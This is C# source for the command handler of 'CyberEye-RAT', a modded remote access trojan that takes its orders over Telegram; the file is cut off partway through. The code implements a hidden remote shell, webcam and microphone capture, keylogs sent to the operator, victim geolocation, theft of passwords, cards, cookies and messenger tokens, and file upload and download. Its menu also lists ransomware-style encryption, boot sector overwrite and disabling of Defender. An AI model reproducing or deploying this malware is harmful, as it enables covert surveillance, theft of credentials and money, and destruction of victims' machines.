/* 
       * Original Version

       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https://github.com/LimerBoy

       * Modded Version

       ^ Author    : Cisamu
       ^ Name      : CyberEye-RAT
       ^ Github    : https://github.com/cisamu123
       > This program is distributed for educational purposes only.
*/

using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Windows.Forms;
using SimpleJSON;
using Microsoft.Win32;
using TelegramRAT.modded;
using TelegramRAT.modded.stealer;

namespace TelegramRAT
{
    internal sealed class commands
    {
        public static string msg;
        // Import dll'ls
        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
        public static extern int mciSendStringA(string lpstrCommand, string lpstrReturnString,
                            int uReturnLength, int hwndCallback);
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("User32", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uiAction, int uiParam, string pvParam, uint fWinIni);

        [DllImport("user32.dll", EntryPoint = "BlockInput")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        public static extern int SendARP(int destIp, int srcIP, byte[] macAddr, ref uint physicalAddrLen);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SendMessage(IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string className, string windowName);

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr handle, int nCmdShow);



        // Commands handler
        public static void handle(string command)
        {
            Console.WriteLine("[~] Handling command " + command);
            string[] args = command.Split(' ');
            args[0] = args[0].Remove(0, 1).ToUpper();

            // Handle commands
            switch (args[0])
            {
                // Help
                case "HELP":
                    {
                        telegram.sendText(
                            "\n 🌎 INFORMATION:" +
                            "\n /ComputerInfo" +
                            "\n /BatteryInfo" +
                            "\n /Location" +
                            "\n /Whois" +
                            "\n /ActiveWindow" +
                            "\n" +
                            "\n🎧 SPYING:" +
                            "\n /Webcam <camera> <delay>" +
                            "\n /Microphone <seconds>" +
                            "\n /Desktop" +
                            "\n /Keylogger" +
                            "\n" +
                            "\n📋 CLIPBOARD:" +
                            "\n /ClipboardSet <text>" +
                            "\n /ClipboardGet" +
                            "\n" +
                            "\n📊 TASKMANAGER:" +
                            "\n /ProcessList" +
                            "\n /ProcessKill <process>" +
                            "\n /ProcessStart <process>" +
                            "\n /TaskManagerDisable" +
                            "\n /TaskManagerEnable" +
                            "\n" +
                            "\n /MinimizeAllWindows" +
                            "\n /MaximizeAllWindows" +
                            "\n" +
                            "\n💳 STEALER:" +
                            "\n /GetPasswords" +
                            "\n /GetCreditCards" +
                            "\n /GetHistory" +
                            "\n /GetBookmarks" +
                            "\n /GetCookies" +
                            "\n /GetDesktop" +
                            "\n /GetFileZilla" +
                            "\n /GetDiscord" +
                            "\n /GetTelegram" +
                            "\n /GetSteam" +
                            "\n" +
                            "\n💿 CD-ROM:" +
                            "\n /OpenCD" +
                            "\n /CloseCD" +
                            "\n" +
                            "\n💼 FILES:" +
                            "\n /DownloadFile <file/dir>" +
                            "\n /UploadFile <drop/url>" +
                            "\n /RunFile <file>" +
                            "\n /RunFileAdmin <file>" +
                            "\n /ListFiles <dir>" +
                            "\n /RemoveFile <file>" +
                            "\n /RemoveDir <dir>" +
                            "\n /MoveFile <filr> <file>" +
                            "\n /CopyFile <file> <file>" +
                            "\n /MoveDir <dir> <dir>" +
                            "\n /CopyDir <dir> <dir>" +
                            "\n" +
                            "\n🚀 COMMUNICATION:" +
                            "\n /Speak <text>" +
                            "\n /Shell <command>" +
                            "\n /MessageBox <error/info/warn> <text>" +
                            "\n /OpenURL <url>" +
                            "\n /SetWallpaper <file>" +
                            "\n /SendKeyPress <keys>" +
                            "\n /NetDiscover <to>" +
                            "\n /Uninstall" +
                            "\n" +
                            "\n🔊 AUDIO: " +
                            "\n /PlayMusic <file>" +
                            "\n /AudioVolumeSet <0-100>" +
                            "\n /AudioVolumeGet" +
                            "\n" +
                            "\n💣 EVIL:" +
                            "\n /BlockInput <seconds>" +
                            "\n /Monitor <on/off/standby>" +
                            "\n /DisplayRotate <0,90,180,270>" +
                            "\n /EncryptFileSystem <password>" +
                            "\n /DecryptFileSystem <password>" +
                            "\n /ForkBomb" +
                            "\n /BSoD" +
                            "\n /OverwriteBootSector" +
                            "\n" +
                            "\n😈 MODDED" +
                            "\n /Beep <frequencyHz> <durationMs>" +
                            "\n /Cycle <target_object (in base 64)> <durationMs>" +
                            "\n /Tray <Show/Hide>" +
                            "\n /SetRandomCurPos <durationMs>" +
                            "\n /Compiler <cs or vb> <code (in base64)>" +
                            "\n /DirOrFile <Show/Hide> <path (in base64)>" +
                            "\n /Wifi_Steal <folderPath (in base64)>" +
                            "\n /Regedit <Enable/Disable>" +
                            "\n /Windefender <Enable/Disable>" +
                            "\n /Cmd <Enable/Disable>" +
                            "\n /SystemRestore <Enable/Disable>" +
                            "\n /ScreenResolution" +
                            "\n /isAdmin" +
                            "\n /BugReport <Title> <MessageText>" +
                            "\n /Minecraft <SaveScreenshots (yes or no)> and <CleanFolderAfterCollecting (yes or no)>" +
                            "\n" +
                            "\n💡 POWER:" +
                            "\n /Shutdown" +
                            "\n /Reboot" +
                            "\n /Hibernate" +
                            "\n /Logoff" +
                            "\n" +
                            "\n💰 OTHER:" +
                            "\n /Help" +
                            "\n /About" +
                        "");
                        break;
                    }
                // About
                case "ABOUT":
                    {
                        telegram.sendText(
                            "\n🌟 Original Version" +
                            "\n🦠 ToxicEye" +
                            "\n👑 Coded by LimerBoy" +
                            "\n🔮 github.com/LimerBoy" +
                            "\n🌟 Modded Version" +
                            "\n👁 CyberEye" +
                            "\n👑 Modded by Cisamu" +
                            "\n🔮 github.com/cisamu123" +
                            "");
                        break;
                    }

                // ComputerInfo
                case "COMPUTERINFO":
                    {
                        telegram.sendText(
                            "\n💻 Computer info:" +
                            "\nSystem: " + utils.GetSystemVersion() +
                            "\nComputer name: " + Environment.MachineName +
                            "\nUser name: " + Environment.UserName +
                            "\nSystem time: " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") +
                            "\n" +
                            "\n👾 Protection:" +
                            "\nInstalled antivirus: " + persistence.DetectAntivirus() +
                            "\nStarted as admin: " + utils.IsAdministrator() +
                            "\nProcess protected: " + (config.ProcessBSODProtectionEnabled && utils.IsAdministrator()) +
                            "\n" +
                            "\n👽 Virtualizaion:" +
                            "\nDebugger: " + persistence.inDebugger() +
                            "\nSandboxie: " + persistence.inSandboxie() +
                            "\nVirtualBox: " + persistence.inVirtualBox() +
                            "\n" +
                            "\n🔭 Software:" +
                            "\n" + utils.GetProgramsList() +
                            "\n" +
                            "\n📇 Hardware:" +
                            "\nCPU: " + utils.GetCPUName() +
                            "\nGPU: " + utils.GetGPUName() +
                            "\nRAM: " + utils.GetRamAmount() + "MB" +
                            "\nHWID: " + utils.GetHWID() +
                        "");
                        break;
                    }
                // BatteryInfo
                case "BATTERYINFO":
                    {
                        string batteryStatus = SystemInformation.PowerStatus.BatteryChargeStatus.ToString();
                        string[] batteryLife = SystemInformation.PowerStatus.BatteryLifePercent.ToString().Split(',');
                        string batteryPercent = batteryLife[batteryLife.Length - 1];
                        telegram.sendText(
                            "\n🔋 Battery info:" +
                            "\nBattery status: " + batteryStatus +
                            "\nBattery percent: " + batteryPercent +
                            "\n"
                        );
                        break;
                    }
                // Location
                case "LOCATION":
                    {
                        // Get gateway
                        IPAddress dst = utils.GetDefaultGateway();
                        // Send ARP
                        byte[] macAddr = new byte[6];
                        uint macAddrLen = (uint)macAddr.Length;
                        if (SendARP(BitConverter.ToInt32(dst.GetAddressBytes(), 0), 0, macAddr, ref macAddrLen) != 0)
                        {
                            telegram.sendText("🔎 Send ARP failed!");
                            break;
                        }
                        // Get BSSID
                        string[] str = new string[(int)macAddrLen];
                        for (int i = 0; i < macAddrLen; i++)
                            str[i] = macAddr[i].ToString("x2");
                        string bssid = string.Join(":", str);

                        string url = @"https://api.mylnikov.org/geolocation/wifi?bssid=" + bssid;
                        // GET request
                        WebClient client = new WebClient();
                        string response = client.DownloadString(url);
                        // Parse json
                        var json = JSON.Parse(response);
                        if (json["result"] == 200)
                        {
                            var data = json["data"];
                            float lat = 0.0f, lon = 0.0f, range = 0.0f;

                            lat = data["lat"];
                            lon = data["lon"];
                            if (data.HasKey("range"))
                                range = data["range"];

                            telegram.sendLocation(lat, lon);
                            telegram.sendText(
                                "\n📡 Location:" +
                                "\n Latitude: " + lat +
                                "\n Longitude: " + lon +
                                "\n Range: " + range +
                                "\n" +
                                "\n BSSID: " + bssid +
                                "\n Router: " + dst.ToString() +
                                "");
                        } else
                        {
                            telegram.sendText(
                                "\n📡 Failed locate target by BSSID" +
                                "\n BSSID: " + bssid +
                                "\n Router: " + dst.ToString() +
                                "");
                            break;
                        }
                        break;
                    }
                // Whois
                case "WHOIS":
                    {
                        string url = @"http://ip-api.com/json/";
                        // GET request
                        WebClient client = new WebClient();
                        string response = client.DownloadString(url);
                        // Parse json
                        dynamic json = JSON.Parse(response);
                        telegram.sendText(
                            "\n📡 Whois:" +
                            "\nIP: " + json["query"] +
                            "\nCountry: " + json["country"] + "[" + json["countryCode"] + "]" +
                            "\nCity: " + json["city"] +
                            "\nRegion: " + json["regionName"] +
                            "\nInternet provider: " + json["isp"] +
                            "\nLatitude: " + json["lat"] +
                            "\nLongitude: " + json["lon"] +
                            "");
                        break;
                    }
                // ActiveWindow
                case "ACTIVEWINDOW":
                    {
                        telegram.sendText("💬 Active window: " + utils.GetActiveWindowTitle());
                        break;
                    }

                // Webcam <camera> <delay>
                case "WEBCAM":
                    {
                        // Args
                        string delay, camera;
                        
                        // Check if args exists
                        try
                        {
                            camera = args[1];
                            delay = args[2];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            delay = "4500";
                            camera = "1";
                        }
                        utils.webcamScreenshot(delay, camera);
                        break;
                    }
                // Microphone <seconds>
                case "MICROPHONE":
                    {
                        string time;
                        // Check if args exists
                        try
                        {
                            time = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <seconds> required for microphone recording!");
                            break;
                        }
                        utils.recordMircophone(time);
                        break;
                    }
                // Desktop
                case "DESKTOP":
                    {
                        utils.desktopScreenshot();
                        break;
                    }
                // Keylogger
                case "KEYLOGGER":
                    {
                        if (!File.Exists(utils.loggerPath))
                        {
                            telegram.sendText("🔌 No keylogs recorded!");
                            break;
                        }
                        string keylogsFile = Path.GetDirectoryName(utils.loggerPath) + "\\keylogs.txt";
                        File.Copy(utils.loggerPath, keylogsFile);
                        telegram.UploadFile(keylogsFile, true);
                        break;
                    }


                // ClipboardSet <text>
                case "CLIPBOARDSET":
                    {
                        string text;
                        // Check if args exists
                        try
                        {
                            text = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <text> required for ClipboardSet command!");
                            break;
                        }
                        // Get all text
                        text = string.Join(" ", args, 1, args.Length - 1);
                        // Set
                        Clipboard.SetText(text);
                        // Log
                        telegram.sendText("📋 Clipboard content changed!");
                        break;
                    }
                // ClipboardGet
                case "CLIPBOARDGET":
                    {
                        string text = Clipboard.GetText();
                        telegram.sendText($"📋 Clipboard content: {text}");
                        break;
                    }


                // ProcessList
                case "PROCESSLIST":
                    {
                        string list = "📊 Process list:\n";
                        foreach (Process process in Process.GetProcesses()) {
                            list += "\n " + process.ProcessName + ".exe";
                        }
                        telegram.sendText(list);
                        break;
                    }
                // ProcessKill <process>
                case "PROCESSKILL":
                    {
                        string processName;
                        // Check if args exists
                        try
                        {
                            processName = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <process> required for ProcessKill command!");
                            break;
                        }
                        // Remove .exe if exists
                        if (processName.EndsWith(".exe"))
                        {
                            processName = processName.Substring(0, processName.Length - 4);
                        }
                        // Kill
                        foreach (var process in Process.GetProcessesByName(processName))
                        {
                            process.Kill();
                        }
                        telegram.sendText($"📊 Processes with name {processName} stopped");
                        break;
                    }
                // ProcessStart <process>
                case "PROCESSSTART":
                    {
                        string processName;
                        // Check if args exists
                        try
                        {
                            processName = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <process> required for ProcessStart command!");
                            break;
                        }
                        // Remove .exe if exists
                        if (processName.EndsWith(".exe"))
                        {
                            processName = processName.Substring(0, processName.Length - 4);
                        }
                        // Start
                        try
                        {
                            Process.Start(processName);
                        }
                        catch (System.ComponentModel.Win32Exception)
                        {
                            telegram.sendText("⛔ Processes not started!");
                            break;
                        }
                        telegram.sendText($"📊 Processes with name {processName} started");
                        break;
                    }
                // TaskManagerEnable
                case "TASKMANAGERENABLE":
                    {
                        try
                        {
                            RegistryKey RegKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                            RegKey.SetValue("DisableTaskMgr", 0);
                            RegKey.Close();
                        } catch
                        {
                            telegram.sendText("⛔ Something was wrong while enabling taskmanager");
                            break;
                        }
                        telegram.sendText("✅ Taskmanager enabled");
                        break;
                    }
                // TaskManagerEnable
                case "TASKMANAGERDISABLE":
                    {
                        try
                        {
                            RegistryKey RegKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                            RegKey.SetValue("DisableTaskMgr", 1);
                            RegKey.Close();
                        } catch
                        {
                            telegram.sendText("⛔ Something was wrong while disabling taskmanager");
                            break;
                        }
                        telegram.sendText("❎ Taskmanager disabled");
                        break;
                    }
                // MinimizeAllWindows
                case "MINIMIZEALLWINDOWS":
                    {
                        utils.MinimizeAllWindows();
                        telegram.sendText("🎴 All windows minimized");
                        break;
                    }
                // MaximizeAllWindows
                case "MAXIMIZEALLWINDOWS":
                    {
                        utils.MaximizeAllWindows();
                        telegram.sendText("🎴 All windows maximized");
                        break;
                    }


                // GetPasswords
                case "GETPASSWORDS":
                    {
                        Passwords.get();
                        break;
                    }
                // GetCreditCards
                case "GETCREDITCARDS":
                    {
                        CreditCards.get();
                        break;
                    }
                // GetHistory
                case "GETHISTORY":
                    {
                        History.get();
                        break;
                    }
                // GetBookmarks
                case "GETBOOKMARKS":
                    {
                        
                        Bookmarks.get();
                        break;
                    }
                // GetCookies
                case "GETCOOKIES":
                    {
                        
                        Cookies.get();
                        break;
                    }
                // GetDesktop
                case "GETDESKTOP":
                    {
                        GrabDesktop.get();
                        break;
                    }
                // GetFileZilla
                case "GETFILEZILLA":
                    {
                        
                        FileZilla.get();
                        break;
                    }
                // GetDiscord
                case "GETDISCORD":
                    {
                        DiscordGrabber.get();
                        break;
                    }
                // GetTelegram
                case "GETTELEGRAM":
                    {
                        TelegramGrabber.get();
                        break;
                    }
                // GetSteam
                case "GETSTEAM":
                    {
                        SteamGrabber.get();
                        break;
                    }


                // OpenCD <letter/none>
                case "OPENCD":
                    {
                        // Check if args exists
                        try
                        {
                            string driveLetter = args[1];
                            // One
                            mciSendStringA($"open {driveLetter}: type CDaudio alias drive{driveLetter}", null, 0, 0);
                            mciSendStringA($"set drive{driveLetter} door open", null, 0, 0);
                            telegram.sendText($"💿 CD-ROM OPEN command sent for {driveLetter} device");
                            break;
                        }
                        catch (IndexOutOfRangeException)
                        {
                            // All
                            foreach (char drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray())
                            {
                                mciSendStringA($"open {drive}: type CDaudio alias drive{drive}", null, 0, 0);
                                mciSendStringA($"set drive{drive} door open", null, 0, 0);
                            }
                            telegram.sendText("💿 CD-ROM OPEN command sent for ALL devices");
                            break;
                        }
                    }
                // CloseCD <letter/none>
                case "CLOSECD":
                    {
                        // Check if args exists
                        try
                        {
                            string driveLetter = args[1];
                            // One
                            mciSendStringA($"open {driveLetter}: type CDaudio alias drive{driveLetter}", null, 0, 0);
                            mciSendStringA($"set drive{driveLetter} door closed", "", 0, 0);
                            telegram.sendText($"💿 CD-ROM CLOSE command sent for {driveLetter} device");
                            break;
                        }
                        catch (IndexOutOfRangeException)
                        {
                            // All
                            foreach (char drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray())
                            {
                                mciSendStringA($"open {drive}: type CDaudio alias drive{drive}", null, 0, 0);
                                mciSendStringA($"set drive{drive} door closed", "", 0, 0);
                            }
                            telegram.sendText("💿 CD-ROM CLOSE command sent for ALL devices");
                            break;
                        }
                    }


                // DownloadFile <file/dir>
                case "DOWNLOADFILE":
                    {
                        // Check if args exists
                        string path;
                        try
                        {
                            path = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ No argument <file/dir> found!");
                            break;
                        }
                        // Download
                        telegram.UploadFile(path);
                        break;
                    }
                // UploadFile <url>
                case "UPLOADFILE":
                    {
                        // Check if args exists
                        string path;
                        try
                        {
                            path = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ No argument <url> found!");
                            break;
                        }
                        // Upload
                        telegram.DownloadFile(path);
                        break;
                    }
                // ListFiles <dir>
                case "LISTFILES":
                    {
                        string path;
                        try
                        {
                            path = args[1];
                        } catch (IndexOutOfRangeException)
                        {
                            path = ".";
                        }

                        // If dir not exists
                        if (!Directory.Exists(path))
                        {
                            telegram.sendText(string.Format("⛔ Directory \"{0}\" not found!", Path.GetDirectoryName(path + "\\")));
                            break;
                        }

                        string[] files = Directory.GetFiles(path);
                        string[] dirs = Directory.GetDirectories(path);
                        string formatted = "📦 Dirs/Files list:\n\n" + string.Join("\\\n", dirs) + "\\\n" + string.Join("\n", files);
                        telegram.sendText(formatted);
                        break;
                    }
                // RemoveFile <file>
                case "REMOVEFILE":
                    {
                        // Check if args exists
                        string path;
                        try
                        {
                            path = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ No argument <file> found!");
                            break;
                        }
                        // If file not exists
                        if (!File.Exists(path))
                        {
                            telegram.sendText(string.Format("⛔ File \"{0}\" not found!", Path.GetFileName(path)));
                            break;
                        }
                        try
                        {
                            File.Delete(args[1]);
                        } catch
                        {
                            telegram.sendText(string.Format("⛔ File \"{0}\" not removed!", Path.GetFileName(args[1])));
                            break;
                        }
                        telegram.sendText(string.Format("✅ File \"{0}\" removed!", Path.GetFileName(args[1])));
                        break;
                    }
                // RemoveDir <dir>
                case "REMOVEDIR":
                    {
                        // Check if args exists
                        string path;
                        try
                        {
                            path = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ No argument <dir> found!");
                            break;
                        }
                        // If dir not exists
                        if (!Directory.Exists(path))
                        {
                            telegram.sendText(string.Format("⛔ Directory \"{0}\" not found!", Path.GetDirectoryName(path + "\\")));
                            break;
                        }
                        try
                        {
                            Directory.Delete(path, true);
                        }
                        catch
                        {
                            telegram.sendText(string.Format("⛔ Directory \"{0}\" not removed!", Path.GetDirectoryName(path + "\\")));
                            break;
                        }
                        telegram.sendText(string.Format("✅ Directory \"{0}\" removed!", Path.GetDirectoryName(path + "\\")));
                        break;
                    }
                // RunFile <file>
                case "RUNFILE":
                    {
                        // Check if args exists
                        string path;
                        try
                        {
                            path = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ No argument <file> found!");
                            break;
                        }
                        // If file not exists
                        if (!File.Exists(path))
                        {
                            telegram.sendText(string.Format("⛔ File \"{0}\" not found!", Path.GetFileName(path)));
                            break;
                        }
                        try
                        {
                            Process.Start(path);
                        }
                        catch
                        {
                            telegram.sendText(string.Format("⛔ An error occurred!"));
                            break;
                        }
                        telegram.sendText(string.Format("✅ Running file \"{0}\"", Path.GetDirectoryName(path + "\\")));
                        break;
                    }
                // RunFileAdmin <file>
                case "RUNFILEADMIN":
                    {
                        // Check if args exists
                        string path;
                        try
                        {
                            path = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ No argument <file> found!");
                            break;
                        }
                        // If file not exists
                        if (!File.Exists(path))
                        {
                            telegram.sendText(string.Format("⛔ File \"{0}\" not found!", Path.GetFileName(path)));
                            break;
                        }
                        Process proc = new Process();
                        proc.StartInfo.FileName = path;
                        proc.StartInfo.UseShellExecute = true;
                        proc.StartInfo.Verb = "runas";
                        try
                        {
                            proc.Start();
                        }
                        catch (System.ComponentModel.Win32Exception)
                        {
                            telegram.sendText(string.Format("⛔ Operation cancelled by user"));
                            break;
                        }
                        telegram.sendText(string.Format("✅ Running file \"{0}\"", Path.GetDirectoryName(path + "\\")));
                        break;
                    }
                // MoveFile <file> <file>
                case "MOVEFILE":
                    {
                        // Check if args exists
                        string path1, path2;
                        try
                        {
                            path1 = args[1];
                            path2 = args[2];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ No arguments <file>, <file> found!");
                            break;
                        }
                        // If file not exists
                        if (!File.Exists(path1))
                        {
                            telegram.sendText(string.Format("⛔ File \"{0}\" not found!", Path.GetFileName(path1)));
                            break;
                        }
                        // Move file
                        try
                        {
                            File.Move(path1, path2);
                        }
                        catch
                        {
                            telegram.sendText(string.Format("⛔ File \"{0}\" not moved to: \"{1}\"", Path.GetFileName(path1), Path.GetFullPath(Path.GetFileName(path2))));
                            break;
                        }
                        telegram.sendText(string.Format("✅ File \"{0}\" moved to: \"{1}\"", Path.GetFileName(path1), Path.GetFullPath(Path.GetFileName(path2))));
                        break;
                    }
                // CopyFile <file> <file>
                case "COPYFILE":
                    {
                        // Check if args exists
                        string path1, path2;
                        try
                        {
                            path1 = args[1];
                            path2 = args[2];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ No arguments <file>, <file> found!");
                            break;
                        }
                        // If file not exists
                        if (!File.Exists(path1))
                        {
                            telegram.sendText(string.Format("⛔ File \"{0}\" not found!", Path.GetFileName(path1)));
                            break;
                        }
                        // Copy file
                        try
                        {
                            File.Copy(path1, path2);
                        }
                        catch
                        {
                            telegram.sendText(string.Format("⛔ File \"{0}\" not copied to: \"{1}\"", Path.GetFileName(path1), Path.GetFullPath(Path.GetFileName(path2))));
                            break;
                        }
                        telegram.sendText(string.Format("✅ File \"{0}\" copied to: \"{1}\"", Path.GetFileName(path1), Path.GetFullPath(Path.GetFileName(path2))));
                        break;
                    }
                // MoveDir <dir> <dir>
                case "MOVEDIR":
                    {
                        // Check if args exists
                        string path1, path2;
                        try
                        {
                            path1 = args[1];
                            path2 = args[2];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ No arguments <dir>, <dir> found!");
                            break;
                        }
                        // If file not exists
                        if (!Directory.Exists(path1))
                        {
                            telegram.sendText(string.Format("⛔ Directory \"{0}\" not found!", Path.GetDirectoryName(path1 + "\\")));
                            break;
                        }
                        // Move directory
                        try
                        {
                            Directory.Move(path1, path2);
                        }
                        catch
                        {
                            telegram.sendText(string.Format("⛔ Directory \"{0}\" not moved to: \"{1}\"", Path.GetDirectoryName(path1 + "\\"), Path.GetFullPath(Path.GetDirectoryName(path2 + "\\"))));
                            break;
                        }
                        telegram.sendText(string.Format("✅ Directory \"{0}\" moved to: \"{1}\"", Path.GetDirectoryName(path1 + "\\"), Path.GetFullPath(Path.GetDirectoryName(path2 + "\\"))));
                        break;
                    }
                // CopyDir <dir> <dir>
                case "COPYDIR":
                    {
                        // Check if args exists
                        string path1, path2;
                        try
                        {
                            path1 = args[1];
                            path2 = args[2];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ No arguments <dir>, <dir> found!");
                            break;
                        }
                        // If file not exists
                        if (!Directory.Exists(path1))
                        {
                            telegram.sendText(string.Format("⛔ Directory \"{0}\" not found!", Path.GetDirectoryName(path1 + "\\")));
                            break;
                        }
                        // Move directory
                        try
                        {
                            utils.CopyFolder(path1, path2);
                        }
                        catch
                        {
                            telegram.sendText(string.Format("⛔ Directory \"{0}\" not copied to: \"{1}\"", Path.GetDirectoryName(path1 + "\\"), Path.GetFullPath(Path.GetDirectoryName(path2 + "\\"))));
                            break;
                        }
                        telegram.sendText(string.Format("✅ Directory \"{0}\" copied to: \"{1}\"", Path.GetDirectoryName(path1 + "\\"), Path.GetFullPath(Path.GetDirectoryName(path2 + "\\"))));
                        break;
                    }



                // Speak <text>
                case "SPEAK":
                    {
                        // Check if args exists
                        string text;
                        try
                        {
                            text = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <text> is required for /Say");
                            break;
                        }
                        // Get all text
                        text = string.Join(" ", args, 1, args.Length - 1);
                        // Log
                        telegram.sendText($"📢 Speaking text: {text}");
                        // Say
                        SpeechSynthesizer synthesizer = new SpeechSynthesizer();
                        synthesizer.Volume = 100;  // 0...100
                        synthesizer.Rate = -2;     // -10...10
                        synthesizer.Speak(text);
                        break;
                    }
                // MessageBox <type> <text>
                case "MESSAGEBOX":
                    {
                        // Check if args exists
                        string text;
                        string type;
                        try
                        {
                            type = args[1];
                            text = args[2];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Arguments <type>, <text> is required for /MessageBox");
                            break;
                        }
                        args[1] = "";
                        text = string.Join(" ", args, 1, args.Length - 1);
                        // info, error, warn, exclamination, question.
                        MessageBoxIcon icon;
                        if (type == "error")
                            icon = MessageBoxIcon.Error;
                        else if (type == "warn")
                            icon = MessageBoxIcon.Warning;
                        else if (type == "exclamination")
                            icon = MessageBoxIcon.Exclamation;
                        else if (type == "question")
                            icon = MessageBoxIcon.Question;
                        else
                            icon = MessageBoxIcon.Information;
                        // Show
                        telegram.sendText($"📢 Opened messagebox with text {text} and type {type}");
                        MessageBox.Show(new Form() { TopMost = true }, text, type.ToUpper(), MessageBoxButtons.YesNoCancel, icon);

                        break;
                    }
                // OpenURL
                case "OPENURL":
                    {
                        string url;
                        try
                        {
                            url = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <ur> is required for /OpenURL");
                            break;
                        }
                        // Add http to url
                        if(!url.StartsWith("http"))
                        {
                            url = "http://" + url;
                        }
                        // Open
                        try
                        {
                            Process.Start(url);
                        } catch
                        {
                            telegram.sendText("⛔ Failed open URL");
                        }
                        telegram.sendText("📚 URL opened");
                        break;
                    }
                // SendKeyPress <keys>
                case "SENDKEYPRESS":
                    {
                        string keys;
                        try
                        {
                            keys = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <keys> is required for /SendKeyPress");
                            break;
                        }
                        keys = string.Join(" ", args, 1, args.Length - 1);
                        telegram.sendText($"🔘 Sending keys: {keys}");
                        SendKeys.SendWait(keys);
                        break;
                    }
                // ScanNetwork
                case "NETDISCOVER":
                    {
                        int to;
                        try
                        {
                            to = Int32.Parse(args[1]);
                        }
                        catch (IndexOutOfRangeException)
                        {
                            to = 254;
                        }
                        utils.NetDiscover(to);
                        break;
                    }
                // Uninstall
                case "UNINSTALL":
                    {
                        telegram.sendText("💉 Uninstalling malware from device...");
                        persistence.uninstallSelf();
                        Thread.Sleep(2000);
                        Environment.Exit(0);
                        break;
                    }
                // Shell <command>
                case "SHELL":
                    {
                        // Check if args exists
                        string cmd_command;
                        try
                        {
                            cmd_command = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <command> is required for /Shell");
                            break;
                        }
                        cmd_command = "/c " + string.Join(" ", args, 1, args.Length - 1);
                        // Start the child process.
                        Process p = new Process();
                        // Redirect the output stream of the child process.
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.Arguments = cmd_command;
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        p.Start();
                        string stdout = p.StandardOutput.ReadToEnd();
                        string stderr = p.StandardError.ReadToEnd();
                        int code = p.ExitCode;
                        p.WaitForExit();
                        telegram.sendText(
                           "💻 Command output:" +
                            "\n[STDOUT]:" +
                            $"\n{stdout}" +
                            "\n[STDERR]:" +
                            $"\n{stderr}" +
                            $"\n[CODE]: {code}"
                        );
                        break;
                    }


                // Shutdown
                case "SHUTDOWN":
                    {
                        telegram.sendText("💡 Shutdown command received!");
                        Thread.Sleep(1200);
                        utils.PowerCommand("/s /t 0");
                        break;
                    }
                // Reboot
                case "REBOOT":
                    {
                        telegram.sendText("💡 Reboot command received!");
                        Thread.Sleep(1200);
                        utils.PowerCommand("/r /t 0");
                        break;
                    }
                // Hibernate
                case "HIBERNATE":
                    {
                        telegram.sendText("💡 Hibernate command received!");
                        Thread.Sleep(1200);
                        utils.PowerCommand("/h");
                        break;
                    }
                // Logoff
                case "LOGOFF":
                    {
                        telegram.sendText("💡 Logoff command received!");
                        Thread.Sleep(1200);
                        utils.PowerCommand("/l");
                        break;
                    }
                // PlayMusic
                case "PLAYMUSIC":
                    {
                        // Check if args exists
                        string path;
                        try
                        {
                            path = args[1];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Argument <file> is required for /PlayMusic");
                            break;
                        }
                        // If file not exists
                        if (!File.Exists(path))
                        {
